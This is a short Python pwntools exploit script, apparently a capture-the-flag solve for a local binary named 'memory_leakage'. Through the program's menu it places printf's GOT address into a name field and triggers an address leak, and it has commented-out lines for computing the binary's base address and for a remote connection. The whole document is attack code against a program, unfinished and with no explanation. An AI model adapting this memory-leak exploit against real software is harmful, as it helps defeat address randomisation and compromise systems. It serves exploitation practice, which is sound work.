#!/usr/bin/env python3
from pwn import *
exe = ELF('memory_leakage', checksec = False)

p = process(exe.path)
# p = remote('', )

input()
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Name: ', p32(exe.got.printf))
p.sendlineafter(b'Age: ', b'1')

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'1')
# p.recvuntil(b'a'*12)

print(p.recvline())

# exe_leak = int(p.recvline()[:-1], 16)
# exe.address = exe_leak - 0x7a0
# log.info("exe leak: " + hex(exe_leak))
# log.info("exe base: " + hex(exe.address))

p.interactive()